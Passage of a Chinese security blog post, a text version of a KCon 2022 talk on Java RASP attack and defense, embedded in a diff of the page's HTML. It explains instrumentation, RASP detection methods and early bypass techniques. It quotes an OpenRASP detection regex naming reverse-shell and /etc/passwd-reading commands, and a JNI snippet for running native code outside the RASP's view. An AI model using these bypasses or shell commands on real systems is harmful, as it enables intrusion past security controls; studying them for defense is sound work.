@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"glassyamadeus.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="引言该篇文章系2022年笔者在Kcon大会上台前准备的内容文字版，考虑到PPT内容有限，不少地方讲的不会很清楚，特意将演讲内容的文字版补档发出。需要PPT的小伙伴请至Kcon官方Github下载即可，PPT地址。 认识RASP和RASP攻防RASP的核心原理插桩技术简介Java插桩技术基于Java Instrumentation（该包位于java.lang.instrument，于Java SE5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RASP攻防下的黑魔法">
+<meta property="og:url" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/index.html">
+<meta property="og:site_name" content="Glassy@Amadeus&#39;s Zone">
+<meta property="og:description" content="引言该篇文章系2022年笔者在Kcon大会上台前准备的内容文字版，考虑到PPT内容有限，不少地方讲的不会很清楚，特意将演讲内容的文字版补档发出。需要PPT的小伙伴请至Kcon官方Github下载即可，PPT地址。 认识RASP和RASP攻防RASP的核心原理插桩技术简介Java插桩技术基于Java Instrumentation（该包位于java.lang.instrument，于Java SE5">
+<meta property="og:locale">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/1.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/2.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/3.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/4.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/5.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/6.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/7.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/8.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/9.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/10.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/11.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/12.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/13.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/14.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/15.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/16.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/17.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/18.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/19.png">
+<meta property="og:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/20.png">
+<meta property="article:published_time" content="2023-06-11T07:53:04.000Z">
+<meta property="article:modified_time" content="2024-09-27T06:42:57.900Z">
+<meta property="article:author" content="Glassy@Amadeus">
+<meta property="article:tag" content="byPass">
+<meta property="article:tag" content="RASP">
+<meta property="article:tag" content="Kcon">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/1.png">
+
+
+<link rel="canonical" href="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"https://glassyamadeus.github.io/2023/06/11/rasp_tricks/","path":"2023/06/11/rasp_tricks/","title":"RASP攻防下的黑魔法"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>RASP攻防下的黑魔法 | Glassy@Amadeus's Zone</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Glassy@Amadeus's Zone</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Security&Development</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A4%E8%AF%86RASP%E5%92%8CRASP%E6%94%BB%E9%98%B2"><span class="nav-number">2.</span> <span class="nav-text">认识RASP和RASP攻防</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RASP%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">RASP的核心原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.1.</span> <span class="nav-text">插桩技术简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81RASP%E6%9E%B6%E6%9E%84"><span class="nav-number">2.1.2.</span> <span class="nav-text">常见RASP架构</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RASP%E4%B8%8E%E4%BC%A0%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.2.</span> <span class="nav-text">RASP与传统安全产品的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RASP%E3%80%81WAF%E3%80%81%E4%B8%BB%E6%9C%BA%E9%98%B2%E6%8A%A4%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C"><span class="nav-number">2.2.1.</span> <span class="nav-text">RASP、WAF、主机防护有何不同</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RASP%E7%9A%84%E4%B8%80%E4%BA%9B%E7%97%9B%E7%82%B9"><span class="nav-number">2.2.2.</span> <span class="nav-text">RASP的一些痛点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RASP%E5%B8%B8%E7%94%A8%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="nav-number">2.3.</span> <span class="nav-text">RASP常用防御方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">2.3.1.</span> <span class="nav-text">黑白名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90"><span class="nav-number">2.3.2.</span> <span class="nav-text">语义分析&#x2F;词法分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%86%E6%9E%90"><span class="nav-number">2.3.3.</span> <span class="nav-text">上下文分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E5%9B%9E%E9%A1%BE"><span class="nav-number">2.4.</span> <span class="nav-text">常见绕过方式回顾</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JNI%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.1.</span> <span class="nav-text">JNI绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%A0%B4%E5%9D%8FRASP%E8%BF%90%E8%A1%8C%E6%97%B6%E7%BB%93%E6%9E%84"><span class="nav-number">2.4.2.</span> <span class="nav-text">基于反射破坏RASP运行时结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89%E5%9C%A8RASP%E5%AF%B9%E6%8A%97%E4%B8%8A%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-number">2.4.3.</span> <span class="nav-text">冰蝎\哥斯拉在RASP对抗上做了什么</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E5%AF%B9%E6%8A%97%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84tricks%E7%AE%80%E4%BB%8B"><span class="nav-number">3.</span> <span class="nav-text">高对抗场景下的tricks简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BootStrap%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">BootStrap简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BootStrap%E4%B8%8B%E7%9A%84class%E5%85%B7%E6%9C%89%E4%BB%80%E4%B9%88%E7%89%B9%E6%9D%83"><span class="nav-number">3.1.1.</span> <span class="nav-text">BootStrap下的class具有什么特权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E8%87%AA%E5%AE%9A%E4%B9%89class%E7%9A%84classLoader%E6%88%90%E4%B8%BABootStrap"><span class="nav-number">3.1.2.</span> <span class="nav-text">如何使自定义class的classLoader成为BootStrap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnSafe%E7%AE%80%E4%BB%8B"><span class="nav-number">3.2.</span> <span class="nav-text">UnSafe简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UnSafe%E8%83%BD%E5%A4%9F%E5%81%9A%E4%BB%80%E4%B9%88"><span class="nav-number">3.2.1.</span> <span class="nav-text">UnSafe能够做什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96UnSafe%E7%9A%84%E6%89%8B%E6%B3%95"><span class="nav-number">3.2.2.</span> <span class="nav-text">获取UnSafe的手法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RASP%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">一些特殊场景下的RASP绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%BC%E5%AE%B9%E6%80%A7%E5%B7%AE%E5%BC%82"><span class="nav-number">4.1.</span> <span class="nav-text">兼容性差异</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">突破语义分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8%E7%86%94%E6%96%AD"><span class="nav-number">4.3.</span> <span class="nav-text">巧妙利用熔断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%98%E6%98%AF%E7%86%9F%E6%82%89%E7%9A%84%E5%A4%A7%E5%8C%85%E7%BB%95%E8%BF%87"><span class="nav-number">4.4.</span> <span class="nav-text">还是熟悉的大包绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK%E5%AE%98%E6%96%B9%E6%8F%90%E4%BE%9B%E7%9A%84JNI-HOOK%E6%96%B9%E6%A1%88%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.</span> <span class="nav-text">JDK官方提供的JNI HOOK方案绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="nav-number">4.6.</span> <span class="nav-text">黑名单绕过手段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E6%A3%80%E6%B5%8B%E9%80%83%E9%80%B8"><span class="nav-number">4.7.</span> <span class="nav-text">上下文检测逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8A%B1%E5%BC%8F%E5%8D%B8%E8%BD%BDRASP"><span class="nav-number">4.8.</span> <span class="nav-text">花式卸载RASP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RASP%E6%94%BB%E9%98%B2%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">RASP攻防的核心思想总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%9D%A5RASP%E6%94%BB%E9%98%B2%E4%B8%8B%E7%9A%84%E6%80%9D%E8%80%83-%E6%94%BB%E5%87%BB%E8%80%85%E6%96%B9%E5%90%91"><span class="nav-number">5.1.</span> <span class="nav-text">未来RASP攻防下的思考-攻击者方向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E6%9D%A5RASP%E6%94%BB%E9%98%B2%E4%B8%8B%E7%9A%84%E6%80%9D%E8%80%83-RASP%E6%96%B9%E5%90%91"><span class="nav-number">5.2.</span> <span class="nav-text">未来RASP攻防下的思考-RASP方向</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Glassy@Amadeus</p>
+  <div class="site-description" itemprop="description">Security&Development.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://glassyamadeus.github.io/2023/06/11/rasp_tricks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glassy@Amadeus">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glassy@Amadeus's Zone">
+      <meta itemprop="description" content="Security&Development.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="RASP攻防下的黑魔法 | Glassy@Amadeus's Zone">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RASP攻防下的黑魔法
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-06-11 15:53:04" itemprop="dateCreated datePublished" datetime="2023-06-11T15:53:04+08:00">2023-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-27 14:42:57" itemprop="dateModified" datetime="2024-09-27T14:42:57+08:00">2024-09-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">应用安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>该篇文章系2022年笔者在Kcon大会上台前准备的内容文字版，考虑到PPT内容有限，不少地方讲的不会很清楚，特意将演讲内容的文字版补档发出。需要PPT的小伙伴请至Kcon官方Github下载即可，<a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2022/Magic%20in%20RASP-attack%20and%20defense%E3%80%90KCon2022%E3%80%91%20.pdf">PPT地址</a>。</p>
+<h2 id="认识RASP和RASP攻防"><a href="#认识RASP和RASP攻防" class="headerlink" title="认识RASP和RASP攻防"></a>认识RASP和RASP攻防</h2><h3 id="RASP的核心原理"><a href="#RASP的核心原理" class="headerlink" title="RASP的核心原理"></a>RASP的核心原理</h3><h4 id="插桩技术简介"><a href="#插桩技术简介" class="headerlink" title="插桩技术简介"></a>插桩技术简介</h4><p>Java插桩技术基于Java Instrumentation（该包位于java.lang.instrument，于Java SE5开始引入）实现，使用 Instrumentation，开发者可以构建一个独立于应用程序的Agent，来实现替换和修改某些类的定义。</p>
+<p>在Java SE 5时，Instrumentation的实现仅支持在应用启动前添加-javaagent参数的形式实现Agent代理。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/dir/rasp.jar -jar app.jar</span><br></pre></td></tr></table></figure>
+<p>Java SE 6时提供了Attach API，实现了运行时JVM程序的字节码修改。 仅仅需要知道需要注入的Java进程的PID，便可以另起一个Java进程去实现运行时加载JavaAgent。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine virtualMachine = VirtualMachine.attach(<span class="string">&quot;20556&quot;</span>);</span><br><span class="line">virtualMachine.loadAgent(<span class="string">&quot;/dir/rasp.jar&quot;</span>);</span><br><span class="line">virtualMachine.detach();</span><br></pre></td></tr></table></figure>
+
+<h4 id="常见RASP架构"><a href="#常见RASP架构" class="headerlink" title="常见RASP架构"></a>常见RASP架构</h4><p>漏洞，无论是从流量层面上、堆栈层面上、框架层面上，都是极为复杂的，<br>RASP会通过字节码增强技术将检测代码注入到应用的高危行为函数（如命令执行、文件读写等）之前，在应用执行的执行流抵达高危行为前，对应用将要执行的行为、执行行为时的上下文进行综合分析，从而决定是否在高危行为执行前对该执行流进行阻断。</p>
+<img src="/2023/06/11/rasp_tricks/1.png" class="" title="img1">
+
+<h3 id="RASP与传统安全产品的区别"><a href="#RASP与传统安全产品的区别" class="headerlink" title="RASP与传统安全产品的区别"></a>RASP与传统安全产品的区别</h3><h4 id="RASP、WAF、主机防护有何不同"><a href="#RASP、WAF、主机防护有何不同" class="headerlink" title="RASP、WAF、主机防护有何不同"></a>RASP、WAF、主机防护有何不同</h4><table>
+<thead>
+<tr>
+<th></th>
+<th>WAF</th>
+<th>主机防御</th>
+<th>RASP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>检测方式</td>
+<td>流量</td>
+<td>主机行为</td>
+<td>流量+应用行为</td>
+</tr>
+<tr>
+<td>性能</td>
+<td>不消化应用本身性能</td>
+<td>消耗主机性能，但主机侧只负责收集，分析在云端。</td>
+<td>消耗应用性能，拦截相关算法需要在应用测完成收集和分析。</td>
+</tr>
+<tr>
+<td>应对0day的方式</td>
+<td>基于0day流量，需要优先拿到0day的Poc。</td>
+<td>有效防护0day的主机侧恶意行为（如命令执行、文件上传），但缺少流量测信息，只能拦截高危行为，比如一个java web服务调wget下载执行，不能确认是否来自流量侧，不太好下发策略</td>
+<td>有效防护0day应用测恶意行为。且能分析处恶意行为的源头是什么（反序列化、表达式注入等）。</td>
+</tr>
+</tbody></table>
+<h4 id="RASP的一些痛点"><a href="#RASP的一些痛点" class="headerlink" title="RASP的一些痛点"></a>RASP的一些痛点</h4><p>性能消耗：由于RASP的防护逻辑需要消耗应用所在主机性能，这很大程度上决定了RASP无法进行高性能消耗的分析操作。<br>部署相对麻烦：静态部署需要配置启动参数+重启，虽然JDK6便支持了不重启的Attach API，但attach带来的退优化问题难以解决，因此现阶段主流Java Agent（如APM）都还是主要使用了静态部署的方式安装。</p>
+<h3 id="RASP常用防御方式"><a href="#RASP常用防御方式" class="headerlink" title="RASP常用防御方式"></a>RASP常用防御方式</h3><h4 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h4><p>黑白名单检测算法是RASP检测方式中最为常见，也最为简单的防御算法，即明确规定哪些行为是允许的，哪些是不允许的。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//openrasp命令执行黑名单函数示例</span></span><br><span class="line"><span class="attr">command_common</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:    <span class="string">&#x27;算法3 - 识别常用渗透命令（探针）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:  <span class="string">&#x27;log&#x27;</span>,</span><br><span class="line">    <span class="attr">pattern</span>: <span class="string">&#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\(.&#123;1,5&#125;/bin/(?:ba)?sh&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>黑白名单算法最大的问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 白名单的维护需要较大成本。</span><br><span class="line">2. 复杂应用场景，需要维护的黑白名单较为复杂，而过于复杂的黑白名单（可能是具体值、可能是正则）往往会造成较大的性能消耗。</span><br><span class="line">3. 存在一些攻击者和应用都会使用的关键字，导致无法进行处理。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下实例是一个云上每日执行量10W+级别的命令，该命令便使用了攻击者也最喜欢的/bin/sh命令。</span></span><br><span class="line">/bin/sh -c LC_ALL=C /usr/sbin/lpc status | grep -E <span class="string">&#x27;^[ 0-9a-zA-Z_-]*@&#x27;</span> | awk -F<span class="string">&#x27;@&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>&gt;/home/admin/******/temp/prn2338931307557909089xc</span><br></pre></td></tr></table></figure>
+<h4 id="语义分析-词法分析"><a href="#语义分析-词法分析" class="headerlink" title="语义分析/词法分析"></a>语义分析/词法分析</h4><p>语义分析检测算法多用于SQL注入的检测（也有部分RASP在命令执行处也使用了语义分析），核心思路便是检测用户的输入是否导致了行为数据的结构发生了变化。</p>
+<img src="/2023/06/11/rasp_tricks/2.png" class="" title="img2">
+<p>义分析存在的问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 存在一些语义分析未能兼容的语法、关键字，可能会导致语义分析报错。</span><br><span class="line">2. 针对对参数进行了二次处理的场景，RASP可能无法获取参数，从而导致了语义分析的不可用。</span><br></pre></td></tr></table></figure>
+<h4 id="上下文分析"><a href="#上下文分析" class="headerlink" title="上下文分析"></a>上下文分析</h4><p>简单版的上下文分析，即在高危行为函数处进行Hook后，会去对当前调用栈的完整链路进行分析，追踪恶意行为的调用链中是否包含一些危险的堆栈（如反序列化gadgets、表达式等），如包含，则进行拦截。稍微复杂点的上下文分析，会对调用链流程中的多处进行Hook，在抵达高危行为函数的Hook处再对调用链的多个Hook处的内容进行统筹分析，决定策略。</p>
+<p>上下文分析存在的问题：<br>获取堆栈信息存在解决不了的性能瓶颈。</p>
+<h3 id="常见绕过方式回顾"><a href="#常见绕过方式回顾" class="headerlink" title="常见绕过方式回顾"></a>常见绕过方式回顾</h3><h4 id="JNI绕过"><a href="#JNI绕过" class="headerlink" title="JNI绕过"></a>JNI绕过</h4><p>由于JNI属于C侧的恶意代码执行，作为Java应用防护的RASP无法获取C侧的具体行为，因此JNI是对抗RASP的一个主流手法。<br>在有代码执行漏洞的前提下，可以先上传包含恶意C代码的so到服务器（后缀是什么都行），再通过Java的JNI代码去执行该恶意代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Glassy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/Users/glassyamadeus/IdeaProjects/JNIDemo/src/main/java/libglassyForMac.so&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>位于 tomcat lib目录下的tomcat-jni.jar，也包含一些可以利用的现成的JNI函数，可以通过代码执行漏洞去调用。</p>
+<img src="/2023/06/11/rasp_tricks/3.png" class="" title="img3">
